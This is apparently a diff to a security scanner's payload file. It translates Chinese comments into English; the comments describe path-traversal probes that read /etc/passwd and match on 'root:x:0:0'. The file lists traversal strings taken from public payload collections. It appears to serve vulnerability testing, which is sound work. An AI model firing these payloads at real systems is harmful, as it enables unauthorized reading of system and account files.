@@ -1,5 +1,5 @@
-# 路径穿越载荷（读 /etc/passwd）。无占位符；探针走回显通道，匹配特征串 root:x:0:0
-# 精选自 PayloadsAllTheThings/SecLists，仅留 Linux、原始字符，另留 1 条 URL 编码变体垫底
+# Path-traversal payloads (read /etc/passwd). No placeholders; the probe uses the reflection channel, matching the signature root:x:0:0
+# Selected from PayloadsAllTheThings/SecLists, Linux-only and raw characters, with 1 URL-encoded variant kept as a fallback
 ../../../../../../etc/passwd
 ../../../../../../../../../../etc/passwd
 /etc/passwd
